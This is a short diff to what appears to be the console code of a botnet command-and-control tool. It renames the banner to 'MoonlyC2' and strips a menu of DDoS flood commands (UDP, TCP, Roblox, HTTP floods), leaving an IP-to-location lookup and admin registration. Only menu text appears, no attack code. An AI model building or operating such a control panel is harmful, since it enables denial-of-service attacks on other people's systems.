@@ -71,7 +71,7 @@ banner = f"""{gray}
 ⠀⠀⠀⠀⠀⠘⢿⠼⢸⣋⠀⠀⡍⠻⣿⣦⠀
 ⠀⠀⠀⠀⠀⠀⠆⡇⢸⡠⣐⠥⡝⠶⠛⢿⠧
 ⠀⠀⠀⠀⢀⣠⣼⣧⣼⣷⣁⣒⣡⡴⠀⢸⡆
-⠀⠀⠀⣪⠿⠗⠂⠀⠔⠊⠉⠉⠉⠉⢉⢢⠇            {lightwhite}Nebula{gray}
+⠀⠀⠀⣪⠿⠗⠂⠀⠔⠊⠉⠉⠉⠉⢉⢢⠇            {lightwhite}MoonlyC2{gray}
 ⠀⣠⠮⡷⠶⠿⠿⠭⠤⠤⣕⣲⣶⣶⠾⠋⠀
 ⠊⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 """
@@ -85,15 +85,7 @@ help = f"""{lightwhite}HELP         {gray}Shows list of commands
 {lightwhite}CLEAR        {gray}Clears the screen          
 {lightwhite}EXIT         {gray}Disconnects from the net"""
 
-methods = f"""{lightwhite}!udp               {gray}UDP Flood  
-{lightwhite}!tcp               {gray}TCP Flood             
-{lightwhite}!tup               {gray}Tcp and Udp Flood
-{lightwhite}!roblox            {gray}Roblox Udp Flood
-{lightwhite}!junk              {gray}Junk flood
-{lightwhite}!hex               {gray}Hex Flood            
-{lightwhite}!http_cfb          {gray}Http cfb Flood       
-{lightwhite}!http_req          {gray}Http req Flood       
-{lightwhite}!url_to_ip         {gray}Get Ip from URL      
+methods = f"""
 {lightwhite}!ip_to_location    {gray}Get info from Ip"""
 
 admin_methods = f"""{lightwhite}!register               {gray}Starts registration server
